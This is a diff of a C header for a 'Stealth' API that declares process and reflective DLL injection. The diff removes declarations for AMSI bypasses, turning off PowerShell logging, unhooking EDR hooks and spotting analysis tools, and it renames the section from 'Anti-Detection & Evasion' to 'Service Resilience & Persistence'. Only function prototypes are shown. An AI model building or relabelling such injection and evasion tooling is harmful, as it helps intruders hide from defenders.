@@ -409,35 +409,11 @@ BOOL Stealth_InjectDLL(DWORD processId, const wchar_t* dllPath);
 BOOL Stealth_ReflectiveInject(DWORD processId, const BYTE* dllBytes, size_t dllSize);
 
 // ================================================================
-// Anti-Detection & Evasion
+// Service Resilience & Persistence
 // ================================================================
 
-/**
- * Patch AMSI (Antimalware Scan Interface) to bypass script scanning
- */
-BOOL Stealth_PatchAMSI(void);
-void Stealth_SetAmsiBypassState(BOOL active);
-BOOL Stealth_IsAmsiPatched(void);
-// Optional AMSI bypass variants (lab/testing): hardware breakpoint & NtContinue
-BOOL Stealth_PatchAMSI_HardwareBreakpoint(void);
-BOOL Stealth_PatchAMSI_NtContinue(void);
 void Stealth_ApplyPersistenceProfile(void);
 void Stealth_EnsureLoggingDefaults(void);
-
-/**
- * Disable PowerShell and Command Line event logging
- */
-BOOL Stealth_DisablePowerShellLogging(void);
-
-/**
- * Unhook common API monitoring hooks set by EDR/AV
- */
-BOOL Stealth_UnhookUserModeAPIs(void);
-
-/**
- * Check if running under monitoring/analysis tools
- */
-BOOL Stealth_IsMonitoringDetected(void);
 
 /**
  * Windows Firewall rule management for service binaries
